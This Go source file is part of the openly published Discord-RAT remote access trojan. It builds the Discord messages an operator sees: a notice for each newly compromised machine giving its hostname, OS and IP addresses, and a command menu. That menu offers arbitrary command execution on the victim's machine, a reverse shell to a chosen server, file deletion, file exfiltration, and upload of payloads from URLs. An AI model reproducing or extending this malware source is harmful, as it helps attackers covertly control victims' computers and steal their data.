/*
 * This file is part of the Discord-RAT project.
 * Repository: https://github.com/codeuk/discord-rat
 *
 * Written by codeuk (github.com/codeuk)
 *
 * Discord-RAT is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord-RAT is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord-RAT. If not, see <https://www.gnu.org/licenses/>.
 */
package construct

import (
	"time"

	"github.com/bwmarrin/discordgo"

	"github.com/codeuk/discord-rat/pkg/agent"
)

// Images, URLs and other variables that are constant in the embed.
const (
	EmbedColor = 0x000000
	AvatarURL  = "https://avatars.githubusercontent.com/u/75194878?s=400"
	FooterText = "github.com/codeuk/discord-rat"
)

// Thumbnails to use in the New Agent embed depending on the systems operating system.
var OSThumbnails = map[string]string{
	"Windows": "https://pngimg.com/d/microsoft_PNG13.png",
	"Linux":   "https://www.freepnglogos.com/uploads/linux-png/linux-logo-logo-brands-for-0.png",
}

// Standard embed footer to be used in every embed message.
var EmbedFooter = &discordgo.MessageEmbedFooter{
	IconURL: AvatarURL,
	Text:    FooterText,
}

// ConstructNewAgentEmbed Creates and returns the initial embed to be sent to
// the agents channel with its basic system information for identification.
func ConstructNewAgentEmbed(agent agent.Agent) *discordgo.MessageEmbed {
	return &discordgo.MessageEmbed{
		Color: EmbedColor,
		Fields: []*discordgo.MessageEmbedField{
			{
				Name:   "Hostname",
				Value:  agent.HostName,
				Inline: false,
			}, {
				Name:   "Operating System",
				Value:  agent.OS,
				Inline: false,
			}, {
				Name:   "Local IP",
				Value:  agent.LocalIP,
				Inline: true,
			}, {
				Name:   "External IP",
				Value:  agent.ExternalIP,
				Inline: true,
			},
		},
		Thumbnail: &discordgo.MessageEmbedThumbnail{
			URL: OSThumbnails[agent.OS],
		},
		Timestamp: time.Now().Format(time.RFC3339),
		Title:     "New Agent Connected!", // fmt.Sprintf("%s@%s", agent.HostName, agent.ExternalIP),
		Footer:    EmbedFooter,
	}
}

// ConstructMenuEmbed Creates and returns the embed containing the available commands.
func ConstructMenuEmbed() *discordgo.MessageEmbed {
	return &discordgo.MessageEmbed{
		Color: EmbedColor,
		Description: "Below are the available commands for Discord-RAT.\n" +
			"**Note: There is no command prefix, so be careful! your message will be executed on the agents machine if it doesn't fit one of the commands below.**",
		Fields: []*discordgo.MessageEmbedField{
			{
				Name:   "menu",
				Value:  "Displays this command menu",
				Inline: true,
			}, {
				Name:   "help",
				Value:  "Lists helpful resources for Discord-RAT",
				Inline: true,
			}, {
				Name:   "purge <amount>",
				Value:  "Bulk deletes previous messages",
				Inline: true,
			}, {
				Name:   "ping",
				Value:  "Sends the agents status",
				Inline: true,
			}, {
				Name:   "kill",
				Value:  "Kills the agents session",
				Inline: true,
			}, {
				Name:   "shell <ip> <port>",
				Value:  "Connects to the supplied TCP server",
				Inline: true,
			}, {
				Name:   "cd <directory>",
				Value:  "Changes to the supplied directory",
				Inline: true,
			}, {
				Name:   "delete <agent file>",
				Value:  "Deletes the file on the agents machine",
				Inline: true,
			}, {
				Name:   "\u200b",
				Value:  "\u200b",
				Inline: true,
			}, {
				Name:   "download <agent file>",
				Value:  "Uploads the agents file to the server",
				Inline: true,
			}, {
				Name:   "upload <location> <optional: url>",
				Value:  "Downloads the uploaded attachment or file from URL to the location on the machine",
				Inline: true,
			},
		},

		Timestamp: time.Now().Format(time.RFC3339),
		Title:     "Command Menu",
		Footer:    EmbedFooter,
	}
}

// ConstructHelpEmbed Creates and returns the embed containing helpful resources for Discord-RAT.
func ConstructHelpEmbed() *discordgo.MessageEmbed {
	return &discordgo.MessageEmbed{
		Color:       0x000000,
		Description: "Here are some resources to assist you in using Discord-RAT!",
		Fields: []*discordgo.MessageEmbedField{
			{
				Name:   "GitHub ReadMe (general command overview)",
				Value:  "https://github.com/codeuk/discord-rat",
				Inline: false,
			}, {
				Name:   "GitHub Wiki (in-depth command explanation)",
				Value:  "https://github.com/codeuk/discord-rat/wiki",
				Inline: false,
			},
		},

		Timestamp: time.Now().Format(time.RFC3339),
		Title:     "Help Menu",
	}
}
